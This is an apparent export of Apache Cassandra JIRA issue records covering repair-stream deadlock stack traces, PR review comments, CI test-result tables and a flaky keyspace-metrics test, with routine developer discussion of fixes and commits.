           at org.apache.cassandra.utils.concurrent.ListenerList$$Lambda$862/1049513094.accept(Unknown Source)
           at org.apache.cassandra.utils.concurrent.IntrusiveStack.forEach(IntrusiveStack.java:196)
           at org.apache.cassandra.utils.concurrent.ListenerList.notifyExclusive(ListenerList.java:124)
           at org.apache.cassandra.utils.concurrent.ListenerList.notify(ListenerList.java:96)
           at org.apache.cassandra.utils.concurrent.AsyncFuture.trySet(AsyncFuture.java:104)
           at org.apache.cassandra.utils.concurrent.AbstractFuture.trySuccess(AbstractFuture.java:143)
           at org.apache.cassandra.streaming.StreamResultFuture.maybeComplete(StreamResultFuture.java:242)
           - locked <0x00000003ebe72668> (a org.apache.cassandra.streaming.StreamResultFuture)
           at org.apache.cassandra.streaming.StreamResultFuture.handleSessionComplete(StreamResultFuture.java:199)
           at org.apache.cassandra.streaming.StreamSession.closeSession(StreamSession.java:522)
           - locked <0x00000003ebe72618> (a org.apache.cassandra.streaming.StreamSession)
           at org.apache.cassandra.streaming.StreamSession.initiatorCompleteOrWait(StreamSession.java:911)
           at org.apache.cassandra.streaming.StreamSession.maybeCompleted(StreamSession.java:889)
           - locked <0x00000003ebe72618> (a org.apache.cassandra.streaming.StreamSession)
           at org.apache.cassandra.streaming.StreamSession.taskCompleted(StreamSession.java:951)
           - locked <0x00000003ebe72618> (a org.apache.cassandra.streaming.StreamSession)
           at org.apache.cassandra.streaming.StreamReceiveTask$OnCompletionRunnable.run(StreamReceiveTask.java:138)
           at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81)
           at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)
           at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)
           at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
           at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
           at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
           at java.lang.Thread.run(Thread.java:748)
   ""node1_RepairJobTask:3"":
           at org.apache.cassandra.streaming.StreamSession.abort(StreamSession.java:1119)
           - waiting to lock <0x00000003ebe72618> (a org.apache.cassandra.streaming.StreamSession)
           at org.apache.cassandra.repair.LocalSyncTask$$Lambda$3665/1464650163.accept(Unknown Source)
           at java.util.ArrayList.forEach(ArrayList.java:1257)
           at org.apache.cassandra.repair.LocalSyncTask.abort(LocalSyncTask.java:208)
           - locked <0x00000003ebf78b78> (a org.apache.cassandra.repair.LocalSyncTask)
           at org.apache.cassandra.repair.RepairJob$2$$Lambda$3663/2033513489.accept(Unknown Source)
           at java.util.concurrent.CopyOnWriteArrayList.forEach(CopyOnWriteArrayList.java:891)
           at org.apache.cassandra.repair.RepairJob$2.onFailure(RepairJob.java:236)
           at org.apache.cassandra.utils.concurrent.ListenerList$CallbackListener.run(ListenerList.java:213)
           at org.apache.cassandra.concurrent.ExecutionFailure$1.run(ExecutionFailure.java:124)
           at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
           at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
           at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
           at java.lang.Thread.run(Thread.java:748)
   ```
   Working on a fix for this...
   
   CC @dcapwell 



;01/Jun/22 04:18;githubbot;600","dcapwell commented on code in PR #1649:
URL: https://github.com/apache/cassandra/pull/1649#discussion_r887055519


##########
src/java/org/apache/cassandra/repair/LocalSyncTask.java:
##########
@@ -105,9 +106,9 @@ StreamPlan createStreamPlan()
      * that will be called out of band once the streams complete.
      */
     @Override
-    protected synchronized void startSync()
+    protected void startSync()
     {
-        if (active)
+        if (active.get())

Review Comment:
   race bug where we can start while failing, can do the following to improve (not solve)
   
   ```
   diff --git a/src/java/org/apache/cassandra/repair/LocalSyncTask.java b/src/java/org/apache/cassandra/repair/LocalSyncTask.java
   index 71cec282ad..1772d2ba42 100644
   -;01/Jun/22 17:16;githubbot;600","dcapwell commented on code in PR #1649:
URL: https://github.com/apache/cassandra/pull/1649#discussion_r887099837


##########
src/java/org/apache/cassandra/repair/LocalSyncTask.java:
##########
@@ -105,9 +106,9 @@ StreamPlan createStreamPlan()
      * that will be called out of band once the streams complete.
      */
     @Override
-    protected synchronized void startSync()
+    protected void startSync()
     {
-        if (active)
+        if (active.get())

Review Comment:
   speaking in slack its simpler to just set the stream plan to a future so we can just add a call back and not worry about how we sync; delegate to the future...
   
   ```
   diff --git a/src/java/org/apache/cassandra/repair/LocalSyncTask.java b/src/java/org/apache/cassandra/repair/LocalSyncTask.java
   index 71cec282ad..c6bedd8e01 100644
   -;01/Jun/22 17:29;githubbot;600","maedhroz commented on PR #1649:
URL: https://github.com/apache/cassandra/pull/1649#issuecomment-1145115436

   Committed in 063a37699c3d5b8548b9b7d926daeab3e08eb7db


;02/Jun/22 17:24;githubbot;600","maedhroz closed pull request #1649: CASSANDRA-17663 Ensure FileStreamTask cannot compromise shared channel proxy for system table when interrupted
URL: https://github.com/apache/cassandra/pull/1649


;02/Jun/22 17:24;githubbot;600","maedhroz commented on PR #1648:
URL: https://github.com/apache/cassandra/pull/1648#issuecomment-1145115840

   Committed in 663e51d92868cbd045a83d7fa53e373bb28721a0


;02/Jun/22 17:25;githubbot;600","maedhroz closed pull request #1648: CASSANDRA-17663 Ensure FileStreamTask cannot compromise shared channel proxy for system table when interrupted
URL: https://github.com/apache/cassandra/pull/1648


;02/Jun/22 17:25;githubbot;600","maedhroz commented on PR #1647:
URL: https://github.com/apache/cassandra/pull/1647#issuecomment-1145116098

   Committed in a00d8fd5ba9d73a377d1a11e6f540c56d66e9c8f


;02/Jun/22 17:25;githubbot;600","maedhroz closed pull request #1647: CASSANDRA-17663 Ensure FileStreamTask cannot compromise shared channel proxy for system table when interrupted
URL: https://github.com/apache/cassandra/pull/1647


;02/Jun/22 17:25;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,15600,,,0,15600,,,,,,,,,,,,,,,,,CASSANDRA-17706,CASSANDRA-17740,CASSANDRA-18370,,CASSANDRA-17466,,,,,,CASSANDRA-17648,,,,,,,,,,,,,,,,,,,,0.0,maedhroz,,,,,,,,,,,,,,Availability -> Process Crash,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Jun 02 17:27:49 UTC 2022,,,,,,,All,,,,"0|z12ovk:",9223372036854775807,,,,dcapwell,jmeredithco,marcuse,,Critical,,3.0.0,,https://github.com/apache/cassandra/commit/a00d8fd5ba9d73a377d1a11e6f540c56d66e9c8f,,,,,,,,,new in-JVM dtest,,,,,"25/May/22 21:17;maedhroz;Given CASSANDRA-17648 already exists, I'd like to defer 3.x work on this issue there. {{RepairErrorsTest}}, for example, does not yet exist in 3.x, and I'd like to move it over in its entirety.;;;","25/May/22 22:12;maedhroz;The 4.1 and trunk patches are going to be a bit different, but in the mean time, here's 4.0...

[4.0 patch|https://github.com/apache/cassandra/pull/1647]
[4.0 CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17663-4.0&filter=all]

UPDATE: Tests look reasonable. There are a couple existing and unrelated failures.;;;","26/May/22 18:21;maedhroz;Due to some complications w/ the new Simulator code, the 4.1/trunk patch (outside the new test) is slightly different than 4.0. The basic idea is the same though...get a preferred IP/connect-to address before control transfers to a possibly interruptible thread.

|4.1|trunk|
|[patch|https://github.com/apache/cassandra/pull/1648]|[patch|https://github.com/apache/cassandra/pull/1649]|
|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17663-4.1&filter=all]|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17663-trunk&filter=all]|

CC [~benedict];;;","26/May/22 22:28;maedhroz;Had to fix a little issue in {{BulkLoadConnectionFactory}} that was popping up as a failure in {{SSTableLoaderEncryptionOptionsTest#bulkLoaderSuccessfullyStreamsOverSsl()}} on 4.1 and trunk. (The fix in 4.0 doesn't touch the code, so it should be fine.);;;","26/May/22 22:35;maedhroz;Early returns for trunk on CircleCI are looking good. The issues w/ {{utests_system_keyspace_directory}} have been seen recently elsewhere by [others|https://the-asf.slack.com/archives/CK23JSY2K/p1653500597235699].;;;","31/May/22 22:00;dcapwell;+1;;;","31/May/22 23:31;jonmeredith;+1 

I worry about these kinds of queries in general and wonder if we should have some kind of isolation for system table queries against interruption in a separate executor service, but that's beyond the scope of fixing this individual issue.;;;","01/Jun/22 22:02;maedhroz;Thanks to [~jonmeredith] and [~dcapwell] for the reviews.

At this point, all I'm waiting for is a final round of testing for the 3 branches...;;;","02/Jun/22 16:27;maedhroz;Test results are looking good. (Seems like the {{utests_system_keyspace_directory}} failures are preexisting.) Starting commit...;;;","02/Jun/22 17:27;maedhroz;Commits:

4.0 - https://github.com/apache/cassandra/commit/a00d8fd5ba9d73a377d1a11e6f540c56d66e9c8f
4.1 - https://github.com/apache/cassandra/commit/663e51d92868cbd045a83d7fa53e373bb28721a0
trunk - https://github.com/apache/cassandra/commit/063a37699c3d5b8548b9b7d926daeab3e08eb7db;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Link to dtests is incorrect on the website,CASSANDRA-17662,13446859,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jchrys,brandon.williams,brandon.williams,25/May/22 15:34,28/May/22 10:42,13/Jul/23 08:40,28/May/22 10:42,NA,,,,,,Legacy/Documentation and Website,,,,0,pull-request-available,"This page: https://cassandra.apache.org/_/development/ci.html

links to https://github.com/riptano/cassandra-dtest but should link https://github.com/apache/cassandra-dtest",,jchrys,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jchrys,,,,,,,,,,,,,,Documentation,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Sat May 28 05:17:46 UTC 2022,,,,,,,All,,,,"0|z12oso:",9223372036854775807,,,,mck,,,,Normal,,4.0,,https://github.com/apache/cassandra-website/commit/d5d455c8021b407b657ea685962c7fe5d73f491f,,,,,,,,,staged,,,,,"28/May/22 05:17;jchrys;Opened pull request [#134|https://github.com/apache/cassandra-website/pull/134]

tested in my local environment.

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
jvm-dtest upgrade failures due to 3.x Ping not allowing serialize,CASSANDRA-17660,13446643,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,24/May/22 21:43,17/Jun/22 07:33,13/Jul/23 08:40,25/May/22 21:11,3.0.28,3.11.14,,,,,Test/dtest/java,,,,0,,"trunk jvm upgrade tests periodically fail due to the ping message not being able to be serialized on 3.x branches.  We need support for jvm-dtest even if we ignore the messages.

{code}
Suppressed: java.lang.UnsupportedOperationException
		at org.apache.cassandra.net.PingMessage$PingMessageSerializer.serialize(PingMessage.java:45)
		at org.apache.cassandra.net.PingMessage$PingMessageSerializer.serialize(PingMessage.java:41)
		at org.apache.cassandra.distributed.impl.Instance.serializeMessage(Instance.java:362)
		at org.apache.cassandra.distributed.impl.Instance$1.allowIncomingMessage(Instance.java:302)
		at org.apache.cassandra.net.MessagingService.receive(MessagingService.java:866)
		at org.apache.cassandra.net.IncomingTcpConnection.receiveMessage(IncomingTcpConnection.java:224)
		at org.apache.cassandra.net.IncomingTcpConnection.receiveMessages(IncomingTcpConnection.java:193)
		at org.apache.cassandra.net.IncomingTcpConnection.run(IncomingTcpConnection.java:96)
{code}",,dcapwell,jmckenzie,jonmeredith,,,,,,,,,,,,"smiklosovic closed pull request #1644: CASSANDRA-17660
URL: https://github.com/apache/cassandra/pull/1644


;17/Jun/22 07:33;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Low Hanging Fruit,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jun 01 16:18:33 UTC 2022,,,,,,,All,,,,"0|z12ngo:",9223372036854775807,,,,jmeredithco,,,,Critical,,4.0,,https://github.com/apache/cassandra/commit/c374183c094a49b1f847abfe5ca3fefc210a70dc,,,,,,,,,locally,,,,,"24/May/22 23:08;jonmeredith;+1 provided you get a clean test run.;;;","24/May/22 23:14;dcapwell;will merge tomorrow;;;","25/May/22 18:49;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-3.0|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17660-cassandra-3.0-63BB7235-B29B-4A6D-889C-00208CD02BB9]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17660-cassandra-3.0-63BB7235-B29B-4A6D-889C-00208CD02BB9]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1735/]|
|cassandra-3.11|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17660-cassandra-3.11-63BB7235-B29B-4A6D-889C-00208CD02BB9]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17660-cassandra-3.11-63BB7235-B29B-4A6D-889C-00208CD02BB9]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1736/]|
;;;","01/Jun/22 16:18;jmckenzie;[CI Results]
Branch: 4.1, build number: 38
   butler url: https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1
   jenkins url: https://ci-cassandra.apache.org/job/Cassandra-4.1/38/
   JIRA: CASSANDRA-17660
   commit url: https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=fb8bf30c6d1b6f893a77a74b9e8b4223e5497dd4
   affected paths:
* src/java/org/apache/cassandra/net/PingMessage.java

   Build Result: UNSTABLE
   Passing Tests: 48053
   Failing Tests: 12

||Test|Failures|JIRA||
|org.apache.cassandra.db.SinglePartitionSliceCommandTest.testPartitionDeletionRowDeletionTie-compression|4 of 36|[CASSANDRA-17458?|https://issues.apache.org/jira/browse/CASSANDRA-17458]|
|org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityV3XTest.testAvailability|3 of 36|[CASSANDRA-17310?|https://issues.apache.org/jira/browse/CASSANDRA-17310]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testRangeQuery|2 of 36|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|dtest-upgrade.upgrade_tests.cql_tests.TestCQLNodes3RF3_Upgrade_current_3_11_x_To_indev_4_1_x.test_indexed_with_eq|1 of 36|[CASSANDRA-17627?|https://issues.apache.org/jira/browse/CASSANDRA-17627]|
|org.apache.cassandra.cql3.ViewComplexTTLTest.testUpdateColumnInViewPKWithTTLWithFlush[3]|8 of 36|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.test.SchemaTest.readRepairWithCompaction|5 of 36|[CASSANDRA-17641?|https://issues.apache.org/jira/browse/CASSANDRA-17641]|
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome-cdc|6 of 36|[CASSANDRA-17301?|https://issues.apache.org/jira/browse/CASSANDRA-17301]|
|org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityV30Test.testAvailability|6 of 36|[CASSANDRA-17307?|https://issues.apache.org/jira/browse/CASSANDRA-17307]|
|dtest-offheap.repair_tests.incremental_repair_test.TestIncRepair.test_multiple_repair|2 of 36|[CASSANDRA-11268?|https://issues.apache.org/jira/browse/CASSANDRA-11268]|
|org.apache.cassandra.distributed.test.CASTest.testConflictingWritesWithStaleRingInformation|8 of 36|[CASSANDRA-17461?|https://issues.apache.org/jira/browse/CASSANDRA-17461]|
|org.apache.cassandra.distributed.upgrade.MixedModeReadRepairWriteTest.mixedModeReadRepairUpdate|2 of 36|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|dtest-offheap.repair_tests.repair_test.TestRepair.test_dead_sync_participant|2 of 36|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20""*TestRepair*""]
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failures: org.apache.cassandra.metrics.KeyspaceMetricsTest.testMetricsCleanupOnDrop,CASSANDRA-17658,13446618,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jlewandowski,adelapena,adelapena,24/May/22 18:25,05/Oct/22 22:22,13/Jul/23 08:40,12/Aug/22 12:03,4.1-beta1,5.0,,,,,Test/unit,,,,0,,"The test {{org.apache.cassandra.metrics.KeyspaceMetricsTest.testMetricsCleanupOnDrop}} seems to be flaky on CircleCI, although I haven't seen it failing on Jenkins.

It was first detected during CASSANDRA-17509, on [this run|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/211/workflows/2cbb5465-a970-440b-a502-06e380ce6851/jobs/1977/tests]:
{code}
junit.framework.AssertionFailedError: org.apache.cassandra.metrics.keyspace.AdditionalWrites.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.AllMemtablesLiveDataSize.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.AllMemtablesOffHeapDataSize.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.AllMemtablesOnHeapDataSize.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.AntiCompactionTime.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.BloomFilterDiskSpaceUsed.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.BloomFilterOffHeapMemoryUsed.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.BytesValidated.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.CasCommitLatency.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.CasCommitTotalLatency.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.CasPrepareLatency.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.CasPrepareTotalLatency.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.CasProposeLatency.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.CasProposeTotalLatency.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.ClientTombstoneAborts.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.ClientTombstoneWarnings.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.ColUpdateTimeDeltaHistogram.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.CompressionMetadataOffHeapMemoryUsed.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.CoordinatorReadSize.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.CoordinatorReadSizeAborts.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.CoordinatorReadSizeWarnings.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.IdealCLWriteLatency.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.IdealCLWriteTotalLatency.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.IndexSummaryOffHeapMemoryUsed.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.LiveDiskSpaceUsed.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.LiveScannedHistogram.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.LocalReadSize.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.LocalReadSizeAborts.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.LocalReadSizeWarnings.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.MemtableColumnsCount.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.MemtableLiveDataSize.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.MemtableOffHeapDataSize.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.MemtableOnHeapDataSize.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.MemtableSwitchCount.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.PartitionsValidated.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.PendingCompactions.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.PendingFlushes.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.RangeLatency.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.RangeTotalLatency.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.ReadLatency.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.ReadTotalLatency.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.RepairJobsCompleted.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.RepairJobsStarted.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.RepairPrepareTime.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.RepairSyncTime.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.RepairTime.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.RepairedDataInconsistenciesConfirmed.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.RepairedDataInconsistenciesUnconfirmed.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.RepairedDataTrackingOverreadRows.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.RepairedDataTrackingOverreadTime.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.RowIndexSize.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.RowIndexSizeAborts.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.RowIndexSizeWarnings.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.SSTablesPerReadHistogram.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.SpeculativeFailedRetries.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.SpeculativeInsufficientReplicas.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.SpeculativeRetries.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.TombstoneScannedHistogram.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.TotalDiskSpaceUsed.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.ValidationTime.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.ViewLockAcquireTime.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.ViewReadTime.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.WriteFailedIdealCL.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.WriteLatency.keyspacemetricstest_metrics_cleanup,org.apache.cassandra.metrics.keyspace.WriteTotalLatency.keyspacemetricstest_metrics_cleanup expected:<0> but was:<65>
	at org.apache.cassandra.metrics.KeyspaceMetricsTest.testMetricsCleanupOnDrop(KeyspaceMetricsTest.java:74)
{code}

The failure can be reproduced on the multiplexer with 1000 iterations:

{code}
.circleci/generate.sh -m \
  -e REPEATED_UTEST_TARGET=testsome \
  -e REPEATED_UTEST_COUNT=1000 \
  -e REPEATED_UTEST_CLASS=org.apache.cassandra.metrics.KeyspaceMetricsTest
{code}

||Branch||CI||
|4.0  |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1600/workflows/8fb4ec32-2c95-4632-b49d-ece200a137fc] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1600/workflows/6c67767a-faaf-42cc-b707-0ca917e367cd]|
|4.1  |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1601/workflows/2fd10a07-26d6-4de5-b1e5-25c14eeda1ad] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1601/workflows/9f588839-3c06-4270-adf4-9f8a1f177e00]|
|trunk|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1599/workflows/e8f25806-5f84-478a-b238-2cf375da5fbe] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1599/workflows/7ecb9fc6-b737-4b7a-b7c0-41d6cc9eb6fd]|

The failure can be reproduced on 4.1 and trunk, but apparently not in 4.0. Flakiness seems below 10%.",,adelapena,e.dimitrova,jlewandowski,,,,,,,,,,,,"jacek-lewandowski opened a new pull request, #1784:
URL: https://github.com/apache/cassandra/pull/1784

   Fix a race condition where a keyspace can be opened while it is being removed
   


;12/Aug/22 05:25;githubbot;600","jacek-lewandowski closed pull request #1784: CASSANDRA-17658 (trunk)
URL: https://github.com/apache/cassandra/pull/1784


;13/Sep/22 07:03;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1200,,,0,1200,,,,,,,,,,,,,,,CASSANDRA-17071,,,,,,,,,,,,CASSANDRA-17819,,,,,,,,CASSANDRA-17509,,,,,,,,,,,,0.0,jlewandowski,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Aug 17 17:28:49 UTC 2022,,,,,,,All,,,,"0|z12nb4:",9223372036854775807,,,,adelapena,e.dimitrova,,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra/commit/c1d89c32d27921d1f77f05d29ee248b8922a4c76,,,,,,,,,Repeated runs for the flaky test,,,,,"25/May/22 14:56;adelapena;The test checks that deleting a keyspace also deletes its metrics. I suspect that this failure is hitting a race introduced by CASSANDRA-17071, maybe around {{{}Schema#maybeRemoveKeyspaceInstance{}}}. Indeed, the test used to pass right before that commit ([j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1611/workflows/e2fe5f89-2ec9-4897-8f9a-07f467a874be] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1611/workflows/59e81b6c-4506-400e-8370-77125536c87a]) and it started to be flaky right after that commit ([j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1610/workflows/9ba746fc-574b-4e81-8f9a-0af278b9277d] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1610/workflows/2eb057c6-ef97-4682-a32c-d1fa1bc2cb2d]).

CC [~jlewandowski] [~blambov] [~ifesdjeen] ;;;","13/Jun/22 11:22;adelapena;[Here|https://github.com/jacek-lewandowski/cassandra/commit/e936f120b7ee1936bab6f62810a6d75af1bb7874] is the patch provided by [~jlewandowski], with [some repeated runs for 4.1 j8-j8|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/226/workflows/808cc7d1-03a0-4161-b56c-ca3d6477dfaf/jobs/1491]. I've started full CI for 4.1 and trunk:

||PR||CI||
|[4.1  |https://github.com/apache/cassandra/compare/trunk...adelapena:17658-4.1-review]  |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1700/workflows/4dd40b1d-8a89-42d2-b5eb-6df7d1f26820] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1700/workflows/33cb8efd-7883-4111-93ed-b248d163e204]|
